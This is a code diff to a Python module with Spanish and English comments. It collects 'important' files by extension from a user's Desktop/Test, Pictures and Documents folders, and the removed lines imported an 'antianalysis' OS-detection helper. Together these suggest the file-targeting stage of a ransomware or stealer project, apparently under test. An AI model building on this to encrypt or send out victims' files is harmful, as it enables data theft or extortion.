@@ -1,5 +1,4 @@
 import os
-from antianalysis import so_detection
 
 def is_important_file(file):
     extensions = { # Diccionario con categorías de archivos y sus extensiones correspondientes
@@ -19,24 +18,30 @@ def is_important_file(file):
     is_important = any(extension.lower() in ext_list for ext_list in extensions.values()) # Verificar si la extensión coincide 
     return is_important # Devolver True o False para saber si es importante
 
-def find_files(): # Función que obtiene el directorio y lo pasa a walk_directory
-    so = so_detection()
-    if so == "Windows":
-        directorio_base = os.environ.get('USERPROFILE', None)
-    elif so == "Linux":
-        directorio_base = os.environ.get('HOME', None)
-    if not directorio_base:
-        return "No se ha encontrado el directorio en la variable de entorno."
-    directorio = os.path.join(directorio_base, 'Desktop', 'Test')
-    files = walk_directory(directorio)
+def find_files(): # Función que obtiene los directorios de interés y lo pasa a walk_directory
+    user_directory = os.environ.get('USERPROFILE', None)
+    directories = [
+        #os.path.join(user_directory, 'Desktop'),
+        os.path.join(user_directory, 'Desktop', 'Test'),
+        os.path.join(user_directory, 'Pictures'),
+        os.path.join(user_directory, 'Documents'),
+        #os.path.join(user_directory, 'Music'),
+        #os.path.join(user_directory, 'Videos')
+        #os.path.join(user_directory, 'Dowmloads')
+    ]
+    files = walk_directory(directories)
     return files
 
-def walk_directory(directory): # Recorre un directorio y devuelve los archivos importantes 
+def walk_directory(directories):  # Recursively scans multiple directories and returns important files
     important_files = []
-    for root, _, files in os.walk(directory): # Recorrer directorio de manera recursiva
-        for file in files:
-            if is_important_file(file):  # Verificar si el archivo es importante 
-                important_files.append(os.path.join(root, file)) # Agregar ruta completa del archivo a la lista
-    return important_files # Devuelve una lista con la ruta absoluta de los archivos importantes
+    if isinstance(directories, str):  
+        directories = [directories]
+    for directory in directories:
+        if os.path.exists(directory):
+            for root, _, files in os.walk(directory):  # Recursively walk through the directory
+                for file in files:
+                    if is_important_file(file):  # Check if the file is important
+                        important_files.append(os.path.join(root, file))  # Add the full file path
+    return important_files  # Return a list of absolute paths of important files 
 
 
